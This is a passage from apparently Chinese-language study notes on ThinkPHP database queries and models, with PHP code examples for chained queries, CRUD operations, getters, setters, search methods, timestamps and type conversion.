错误返回 false； Db::execute(‘update tp_user set username=”孙悟空” where id=29’);</li></ol><h2 id="链式查询方法"><a href="#链式查询方法" class="headerlink" title="链式查询方法"></a>链式查询方法</h2><h3 id="一、where"><a href="#一、where" class="headerlink" title="一、where"></a>一、where</h3><p>1.基础的where查询</p><p>2.索引数组查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;$result &#x3D; Db::name(&#39;user&#39;)-&gt;where([</span><br><span class="line">&#x2F;&#x2F;            &#39;price&#39; &#x3D;&gt; 100,</span><br><span class="line">&#x2F;&#x2F;            &#39;gender&#39;&#x3D;&gt; &#39;男&#39;</span><br><span class="line">&#x2F;&#x2F;        ])-&gt;select();</span><br><span class="line">&#x2F;&#x2F;        $result &#x3D; Db::name(&#39;user&#39;)-&gt;where([</span><br><span class="line">&#x2F;&#x2F;            &#39;price&#39; &#x3D;&gt; [60,70,80],</span><br><span class="line">&#x2F;&#x2F;            &#39;gender&#39;&#x3D;&gt; &#39;男&#39;</span><br><span class="line">&#x2F;&#x2F;        ])-&gt;select();</span><br><span class="line">$result &#x3D; Db::name(&#39;user&#39;)-&gt;where([</span><br><span class="line">[&#39;price&#39;,&#39;&#x3D;&#39;,100],</span><br><span class="line">[&#39;gender&#39;,&#39;&#x3D;&#39;,&#39;男&#39;]</span><br><span class="line">])-&gt;select();</span><br></pre></td></tr></table></figure><p>3.复杂数组拆分</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$map[] &#x3D; [&#39;gender&#39;, &#39;&#x3D;&#39;, &#39;男&#39;]; </span><br><span class="line">$map[] &#x3D; [&#39;price&#39;, &#39;in&#39;, [60, 70, 80]];</span><br><span class="line">$result &#x3D; Db::name(&#39;user&#39;)-&gt;where($map)-&gt;select();</span><br></pre></td></tr></table></figure><p>4.字符串形式传递</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Db::name(&#39;user&#39;)-&gt;where(&#39;gender&#x3D;&quot;男&quot; AND price IN (60, 70, 80)&#39;)-&gt;select();</span><br></pre></td></tr></table></figure><h3 id="二、field"><a href="#二、field" class="headerlink" title="二、field"></a>二、field</h3><p>1.指定字段名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Db::name(&#39;user&#39;)-&gt;field(&#39;id, username, email&#39;)-&gt;select(); </span><br><span class="line">Db::name(&#39;user&#39;)-&gt;field([&#39;id&#39;, &#39;username&#39;, &#39;email&#39;])-&gt;select();</span><br></pre></td></tr></table></figure><p>2.设置别名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Db::name(&#39;user&#39;)-&gt;field(&#39;id,username as name,email&#39;)-&gt;select()</span><br></pre></td></tr></table></figure><p>3.可以直接在里面调用函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Db::name(&#39;user&#39;)-&gt;field(&#39;id,username as name,email,sum(price)&#39;)-&gt;select()</span><br></pre></td></tr></table></figure><p>4.true参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$result &#x3D; Db::name(&#39;user&#39;)-&gt;field(true)-&gt;select();</span><br><span class="line">显式查询所有字段名</span><br><span class="line"> $result &#x3D; Db::name(&#39;user&#39;)-&gt;field(&#39;username&#39;,true)-&gt;select();</span><br><span class="line"> 不显示username字段</span><br></pre></td></tr></table></figure><p>5.insert</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Db::name(&#39;user&#39;)-&gt;field(&#39;username, email, details&#39;)-&gt;insert($data);</span><br></pre></td></tr></table></figure><h3 id="三、alias"><a href="#三、alias" class="headerlink" title="三、alias"></a>三、alias</h3><ol><li>使用 alias()方法，给数据库起一个别名； <code>Db::name(&#39;user&#39;)-&gt;alias(&#39;a&#39;)-&gt;select();</code></li></ol><h3 id="四、limit方法"><a href="#四、limit方法" class="headerlink" title="四、limit方法"></a>四、limit方法</h3><p>1.实现输出限制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$result &#x3D; Db::name(&#39;user&#39;)-&gt;limit(5)-&gt;select();</span><br></pre></td></tr></table></figure><p>2.实现分页</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$result &#x3D; Db::name(&#39;user&#39;)-&gt;limit(5,5)-&gt;select();</span><br></pre></td></tr></table></figure><p>第一个参数是起始的位置，第二个参数是长度</p><h3 id="五、page方法实现自动分页"><a href="#五、page方法实现自动分页" class="headerlink" title="五、page方法实现自动分页"></a>五、page方法实现自动分页</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Db::name(&#39;user&#39;)-&gt;page(1, 5)-&gt;select(); </span><br><span class="line">&#x2F;&#x2F;第二页 Db::name(&#39;user&#39;)-&gt;page(2, 5)-&gt;select();</span><br></pre></td></tr></table></figure><p>###　六、order排序方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 使用 order()方法，可以指定排序方式，没有指定第二参数，默认 asc； Db::name(&#39;user&#39;)-&gt;order(&#39;id&#39;, &#39;desc&#39;)-&gt;select();</span><br><span class="line">2. 支持数组的方式，对多个字段进行排序； Db::name(&#39;user&#39;)-&gt;order([&#39;create_time&#39;&#x3D;&gt;&#39;desc&#39;, &#39;price&#39;&#x3D;&gt;&#39;asc&#39;])-&gt;select();</span><br><span class="line">在同一创建的时间，再按照价格来排序</span><br></pre></td></tr></table></figure><h3 id="七、group方法"><a href="#七、group方法" class="headerlink" title="七、group方法"></a>七、group方法</h3><ol><li>使用 group()方法，给性别不同的人进行 price 字段的总和统计； Db::name(‘user’)-&gt;field(‘gender, sum(price)’)-&gt;group(‘gender’)-&gt;select();</li><li>也可以进行多字段分组统计； Db::name(‘user’)-&gt;field(‘gender, sum(price)’) -&gt;group(‘gender,password’)-&gt;select();</li></ol><h3 id="八、having方法"><a href="#八、having方法" class="headerlink" title="八、having方法"></a>八、having方法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$result &#x3D; Db::name(&#39;user&#39;) -&gt;field(&#39;gender, sum(price)&#39;) -&gt;group(&#39;gender&#39;) -&gt;having(&#39;sum(price)&gt;600&#39;) -&gt;select();</span><br></pre></td></tr></table></figure><h2 id="模型的定义"><a href="#模型的定义" class="headerlink" title="模型的定义"></a>模型的定义</h2><p>模型的类名和控制器相同的名字相同时，可以直接采取别名<code>as</code></p><p>如果类名和关键字的相同时，就可以开启<code>class_suffix</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">class User extends Model&#x2F;&#x2F;只要定义了就和数据库自动链接了</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F;设置主键</span><br><span class="line">    protected $pk &#x3D; &#39;uid&#39;;</span><br><span class="line">    &#x2F;&#x2F;设置其他表</span><br><span class="line">    protected $table &#x3D; &#39;tp_one&#39;;</span><br><span class="line">    &#x2F;&#x2F;初始化</span><br><span class="line">    protected static function init()</span><br><span class="line">    &#123;</span><br><span class="line">        &#x2F;&#x2F;parent::init(); &#x2F;&#x2F; TODO: Change the autogenerated stub</span><br><span class="line">        echo &quot;初始化&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">namespace app\controller;</span><br><span class="line">use \app\model\User as UserModel;&#x2F;&#x2F;模型操作不需要指定表</span><br><span class="line"></span><br><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">    public function index()</span><br><span class="line">    &#123;</span><br><span class="line">        &#x2F;&#x2F; UserModel.class.php</span><br><span class="line">        &#x2F;&#x2F; UserController.class.php</span><br><span class="line">        $result &#x3D; UserModel::select();</span><br><span class="line">        &#x2F;&#x2F;return json($result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>数据库操作返回的列表时一个二维数组，模型返回的是一个结果集</p><h2 id="模型添加与删除"><a href="#模型添加与删除" class="headerlink" title="模型添加与删除"></a>模型添加与删除</h2><h3 id="一、增加"><a href="#一、增加" class="headerlink" title="一、增加"></a>一、增加</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//$user = new \app\model\User();</span></span><br><span class="line">        $user = <span class="keyword">new</span> UserModel();</span><br><span class="line">        <span class="comment">//return $user;</span></span><br><span class="line"><span class="comment">//        $user-&gt;username = &#x27;李白&#x27;;</span></span><br><span class="line"><span class="comment">//        $user-&gt;password = &#x27;123&#x27;;</span></span><br><span class="line"><span class="comment">//        $user-&gt;gender = &#x27;男&#x27;;</span></span><br><span class="line"><span class="comment">//        $user-&gt;email = &#x27;libai@163.com&#x27;;</span></span><br><span class="line"><span class="comment">//        $user-&gt;price = 100;</span></span><br><span class="line"><span class="comment">//        $user-&gt;details = &#x27;123&#x27;;</span></span><br><span class="line"><span class="comment">//        $user-&gt;uid = 1011;</span></span><br><span class="line"><span class="comment">//        $user-&gt;create_time = date(&#x27;Y-m-d H:i:s&#x27;);</span></span><br><span class="line"><span class="comment">//        $insert = $user-&gt;save([ &#x27;username&#x27; =&gt; &#x27;李白&#x27;, &#x27;password&#x27; =&gt; &#x27;123&#x27;, &#x27;gender&#x27; =&gt; &#x27;男&#x27;, &#x27;email&#x27; =&gt; &#x27;libai@163.com&#x27;, &#x27;price&#x27; =&gt; 100, &#x27;details&#x27; =&gt; &#x27;123&#x27;, &#x27;uid&#x27; =&gt; 1011, &#x27;create_time&#x27; =&gt; date(&#x27;Y-m-d H:i:s&#x27;) ]);</span></span><br><span class="line"><span class="comment">//        return Db::getLastSql()</span></span><br><span class="line"><span class="comment">//        echo $insert;//bool值</span></span><br><span class="line"><span class="comment">//        $user-&gt;replace()-&gt;save();</span></span><br><span class="line"><span class="comment">//        $user-&gt;replace()-&gt;save();replace插入</span></span><br><span class="line">        <span class="comment">//批量新增</span></span><br><span class="line"><span class="comment">//        $dataAll = [ [ &#x27;username&#x27; =&gt; &#x27;李白 1&#x27;, &#x27;password&#x27; =&gt; &#x27;123&#x27;, &#x27;gender&#x27; =&gt; &#x27;男&#x27;, &#x27;email&#x27; =&gt; &#x27;libai@163.com&#x27;, &#x27;price&#x27; =&gt; 100, &#x27;details&#x27; =&gt; &#x27;123&#x27;, &#x27;uid&#x27; =&gt; 1011, &#x27;create_time&#x27; =&gt; date(&#x27;Y-m-d H:i:s&#x27;) ], [ &#x27;username&#x27; =&gt; &#x27;李白 2&#x27;, &#x27;password&#x27; =&gt; &#x27;123&#x27;, &#x27;gender&#x27; =&gt; &#x27;男&#x27;, &#x27;email&#x27; =&gt; &#x27;libai@163.com&#x27;, &#x27;price&#x27; =&gt; 100, &#x27;details&#x27; =&gt; &#x27;123&#x27;, &#x27;uid&#x27; =&gt; 1011, &#x27;create_time&#x27; =&gt; date(&#x27;Y-m-d H:i:s&#x27;) ] ];</span></span><br><span class="line"><span class="comment">//        $user = new UserModel();</span></span><br><span class="line"><span class="comment">//        print_r($user-&gt;saveAll($dataAll));</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="二、删除"><a href="#二、删除" class="headerlink" title="二、删除"></a>二、删除</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> $user &#x3D; UserModel::get(245);</span><br><span class="line">&#x2F;&#x2F;        print_r($user-&gt;delete());</span><br><span class="line">        &#x2F;&#x2F;UserModel::destroy(244);</span><br><span class="line">        &#x2F;&#x2F;批量删除</span><br><span class="line">        &#x2F;&#x2F;UserModel::destroy([243,242]);</span><br><span class="line">        &#x2F;&#x2F;条件删除</span><br><span class="line">        UserModel::where(&#39;id&#39;,&#39;&gt;&#39;,122)-&gt;delete();</span><br><span class="line">        &#x2F;&#x2F;闭包删除</span><br><span class="line">        UserModel::destroy(function ($query)&#123;</span><br><span class="line">            $query-&gt;where(&#39;id&#39;,&#39;&gt;&#39;,118);</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure><h2 id="模型的修改和查询"><a href="#模型的修改和查询" class="headerlink" title="模型的修改和查询"></a>模型的修改和查询</h2><p>###　模型修改和查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"> public function delete()</span><br><span class="line">    &#123;</span><br><span class="line">&#x2F;&#x2F;        $user &#x3D; UserModel::get(245);</span><br><span class="line">&#x2F;&#x2F;        print_r($user-&gt;delete());</span><br><span class="line">        &#x2F;&#x2F;UserModel::destroy(244);</span><br><span class="line">        &#x2F;&#x2F;批量删除</span><br><span class="line">        &#x2F;&#x2F;UserModel::destroy([243,242]);</span><br><span class="line">        &#x2F;&#x2F;条件删除</span><br><span class="line">        UserModel::where(&#39;id&#39;,&#39;&gt;&#39;,122)-&gt;delete();</span><br><span class="line">        &#x2F;&#x2F;闭包删除</span><br><span class="line">        UserModel::destroy(function ($query)&#123;</span><br><span class="line">            $query-&gt;where(&#39;id&#39;,&#39;&gt;&#39;,118);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    public function update()</span><br><span class="line">    &#123;</span><br><span class="line">&#x2F;&#x2F;        $user &#x3D; UserModel::get(24);</span><br><span class="line">&#x2F;&#x2F;        $user-&gt;username &#x3D; &#39;小刚&#39;;</span><br><span class="line">&#x2F;&#x2F;        $user-&gt;save();</span><br><span class="line">        &#x2F;&#x2F;寻找的时候更加精确的进行</span><br><span class="line">        &#x2F;&#x2F;$user &#x3D; UserModel::where(&#39;username&#39;,&#39;小刚&#39;)-&gt;find();</span><br><span class="line">        &#x2F;&#x2F;save 只能更新变化的数据</span><br><span class="line">        &#x2F;&#x2F;$user-&gt;force()-&gt;save();强制更新</span><br><span class="line">&#x2F;&#x2F;        $user &#x3D; UserModel::get(24);</span><br><span class="line">&#x2F;&#x2F;        $user-&gt;username &#x3D; &#39;小刚&#39;;</span><br><span class="line">&#x2F;&#x2F;        $user-&gt;price &#x3D; Db::raw(&#39;price+1&#39;);</span><br><span class="line">&#x2F;&#x2F;        $user-&gt;price &#x3D; [&#39;inc&#39;,1];</span><br><span class="line">        &#x2F;&#x2F;直接通过 save([],[])两个数组参数的方式更新数据； 第一个是数据，第二个是where</span><br><span class="line">&#x2F;&#x2F;        $user-&gt;save();</span><br><span class="line">&#x2F;&#x2F;        $user &#x3D; new UserModel();</span><br><span class="line">&#x2F;&#x2F;        $user-&gt;saveAll([</span><br><span class="line">&#x2F;&#x2F;            [&#39;id&#39;&#x3D;&gt;118, &#39;username&#39;&#x3D;&gt;&#39;李白&#39;, &#39;email&#39;&#x3D;&gt;&#39;libai@163.com&#39;], [&#39;id&#39;&#x3D;&gt;128, &#39;username&#39;&#x3D;&gt;&#39;李白&#39;, &#39;email&#39;&#x3D;&gt;&#39;libai@163.com&#39;], [&#39;id&#39;&#x3D;&gt;129, &#39;username&#39;&#x3D;&gt;&#39;李白&#39;, &#39;email&#39;&#x3D;&gt;&#39;libai@163.com&#39;]</span><br><span class="line">&#x2F;&#x2F;        ]);第一条必须是主键，必须是ID</span><br><span class="line">&#x2F;&#x2F;        UserModel::where(&#39;id&#39;, 118)-&gt;update([ &#39;username&#39; &#x3D;&gt; &#39;李黑&#39;, &#39;email&#39; &#x3D;&gt; &#39;lihei@163.com&#39; ]);</span><br><span class="line">&#x2F;&#x2F;        UserModel::update([ &#39;id&#39; &#x3D;&gt; 118, &#39;username&#39; &#x3D;&gt; &#39;李黑&#39;, &#39;email&#39; &#x3D;&gt; &#39;lihei@163.com&#39; ]);</span><br><span class="line">        &#x2F;&#x2F;不用where的时候，第一条数据必须是主键</span><br><span class="line">        &#x2F;&#x2F;显示更新 $user-&gt;isUpdate(true)-&gt;save();</span><br><span class="line">        &#x2F;&#x2F;显示新增 $user-&gt;isUpdate(false)-&gt;save();</span><br><span class="line">        &#x2F;&#x2F;模型-&gt;符号，可以得到单独的字段数据</span><br><span class="line">        &#x2F;&#x2F;模型端 采用 return self::where(&#39;username&#39;, &#39;辉夜&#39;)-&gt;find()-&gt;getAttr(&#39;username&#39;);</span><br><span class="line">&#x2F;&#x2F;        通过 all()方法，实现 IN 模式的多数据获取；</span><br><span class="line">&#x2F;&#x2F;        $user &#x3D; UserModel::all(&#39;79, 118, 128&#39;);</span><br><span class="line">&#x2F;&#x2F;        $user &#x3D; UserModel::all([79, 118, 128]);</span><br><span class="line">&#x2F;&#x2F;        模型支持动态查询：getBy*，*表示字段名；</span><br><span class="line">        UserModel::getByUsername(&#39;辉夜&#39;);</span><br><span class="line">        UserModel::getByEmail(&#39;huiye@163.com&#39;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="模型获取器和修改器"><a href="#模型获取器和修改器" class="headerlink" title="模型获取器和修改器"></a>模型获取器和修改器</h2><p>获取器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;创建一个获取器</span><br><span class="line">    public function getStatusAttr($value,$data)</span><br><span class="line">    &#123;</span><br><span class="line">        $myGet &#x3D; [-1&#x3D;&gt;&#39;删除&#39;,0&#x3D;&gt;&#39;禁用&#39;,1&#x3D;&gt;&#39;正常&#39;,2&#x3D;&gt;&#39;待审核&#39;];</span><br><span class="line">        return $myGet[$data[&#39;status&#39;]];</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;创建一个虚拟字段的获取器，可以对多个字段进行过滤</span><br><span class="line">    public function getNothingAttr($value,$data)&#123;</span><br><span class="line">        return $data;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>动态获取器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$result &#x3D; UserModel::WithAttr(&#39;status&#39;, function ($value) &#123; $status &#x3D; [-1&#x3D;&gt;&#39;删除&#39;, 0&#x3D;&gt;&#39;禁用&#39;, 1&#x3D;&gt;&#39;正常&#39;, 2&#x3D;&gt;&#39;待审核&#39;]; return $status[$value]; &#125;)-&gt;select();</span><br><span class="line">        return json($result);</span><br></pre></td></tr></table></figure><p>修改器（插入，修改，更新，的格式化）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;创建一个修改器</span><br><span class="line">    public function setEmailAttr($value)</span><br><span class="line">    &#123;</span><br><span class="line">        return strtoupper($value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;修改器的优先级高于获取器</span><br></pre></td></tr></table></figure><h2 id="模型搜索器和数据集"><a href="#模型搜索器和数据集" class="headerlink" title="模型搜索器和数据集"></a>模型搜索器和数据集</h2><h3 id="一、模型搜索器"><a href="#一、模型搜索器" class="headerlink" title="一、模型搜索器"></a>一、模型搜索器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;创建一个搜索器，邮箱模糊查询</span><br><span class="line">    public function searchEmailAttr($query, $value,$data)</span><br><span class="line">    &#123;</span><br><span class="line">        $query-&gt;where(&#39;email&#39;, &#39;like&#39;, $value . &#39;%&#39;);</span><br><span class="line">        if(isset($data))&#123;</span><br><span class="line">            $query-&gt;order($data[&#39;sort&#39;]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;创建一个搜索器，限定时间</span><br><span class="line">    public function searchCreateTimeAttr($query, $value)</span><br><span class="line">    &#123;</span><br><span class="line">        $query-&gt;whereBetweenTime(&#39;create_time&#39;, $value[0], $value[1]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>调用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$result  &#x3D; UserModel::withSearch([&#39;email&#39;,&#39;create_time&#39;&#x3D;&gt;&#39;ctime&#39;],[</span><br><span class="line">            &#39;email&#39; &#x3D;&gt; &#39;xiao&#39;,</span><br><span class="line">            &#39;ctime&#39; &#x3D;&gt; [&#39;2014-1-1&#39;, &#39;2019-1-1&#39;],</span><br><span class="line">            &#39;sort&#39; &#x3D;&gt; [&#39;price&#39;&#x3D;&gt;&#39;desc&#39;]</span><br><span class="line">        ])-&gt;select();&#x2F;&#x2F;第一个参数限定搜索器</span><br></pre></td></tr></table></figure><h3 id="二、数据集"><a href="#二、数据集" class="headerlink" title="二、数据集"></a>二、数据集</h3><p><strong>在select前面操作叫链式查询，在后面叫数据集操作</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$result &#x3D; UserModel::select()-&gt;where(&#39;price&#39;,&#39;&lt;&#39;,80)-&gt;order(&#39;id&#39;,&#39;asc&#39;);</span><br><span class="line">        $result-&gt;hidden([&#39;password&#39;]);隐藏</span><br><span class="line">        $result-&gt;visible([&#39;password&#39;]);</span><br><span class="line">        $result-&gt;append([&#39;nothing&#39;])-&gt;withAttr(&#39;email&#39;,function ($value)&#123;</span><br><span class="line">            return strtoupper($value);</span><br><span class="line">            &#125;);不需要返回数据</span><br><span class="line">      $result &#x3D; $result-&gt;filter(function ($data)&#123;</span><br><span class="line">           return $data[&#39;price&#39;] &lt; 80;</span><br><span class="line">        &#125;);</span><br><span class="line">        $result1 &#x3D; UserModel::where(&#39;price&#39;,&#39;&gt;&#39;,80)-&gt;select();</span><br><span class="line">        $result2 &#x3D; UserModel::where(&#39;price&#39;,&#39;&lt;&#39;,80)-&gt;select();</span><br><span class="line">        return json($result1-&gt;diff($result2));&#x2F;&#x2F;需要返回数据&#x2F;&#x2F;并</span><br><span class="line">        return json($result1-&gt;intersect($result2));&#x2F;&#x2F;差集</span><br></pre></td></tr></table></figure><p><strong>filter()需要返回数据，但是withattr()是直接在内存中进行处理的</strong></p><h2 id="模型自动时间戳和只读字段"><a href="#模型自动时间戳和只读字段" class="headerlink" title="模型自动时间戳和只读字段"></a>模型自动时间戳和只读字段</h2><p>全局开启</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 自动写入时间戳字段</span><br><span class="line">    &#39;auto_timestamp&#39;  &#x3D;&gt; false,</span><br></pre></td></tr></table></figure><p>部分开启</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  &#x2F;&#x2F;时间戳自定义</span><br><span class="line">    &#x2F;&#x2F;protected $createTime &#x3D; &#39;create_at&#39;;</span><br><span class="line">     protected $updateTime &#x3D; false;&#x2F;&#x2F;关闭更改时间</span><br><span class="line">&#x2F;&#x2F;也可以动态实现不修改 update_time，具体如下： $user-&gt;isAutoWriteTimestamp(false)-&gt;save();</span><br></pre></td></tr></table></figure><p>只读字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;设置只读字段</span><br><span class="line">    protected $readonly &#x3D; [&#39;username&#39;, &#39;email&#39;];</span><br><span class="line">动态设置</span><br><span class="line">$user-&gt;readonly([&#39;username&#39;, &#39;email&#39;])-&gt;save();</span><br><span class="line">只读字段只支持模型方式不支持数据库方式；</span><br></pre></td></tr></table></figure><h2 id="模型类型转换和数据完成"><a href="#模型类型转换和数据完成" class="headerlink" title="模型类型转换和数据完成"></a>模型类型转换和数据完成</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">在模型端设置你想要类型转换的字段属性，属性值为数组；</span><br><span class="line">protected $type &#x3D; [ </span><br><span class="line">&#39;price&#39; &#x3D;&gt; &#39;integer&#39;,</span><br><span class="line">&#39;status&#39; &#x3D;&gt; &#39;boolean&#39;, </span><br><span class="line">&#39;create_time&#39; &#x3D;&gt; &#39;datetime:Y-m-d&#39; ];</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>类型转换还是会调用属性里的获取器等操作，编码时要注意这方面的问题</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">protected $auto &#x3D; [&#39;email&#39;];</span><br><span class="line">protected $insert &#x3D; [&#39;uid&#39;&#x3D;&gt;1];</span><br><span class="line">protected $update &#x3D; [];</span><br><span class="line">auto 表示新增和修改操作，insert 只表示新增，update 只表示修改</span><br><span class="line"> auto 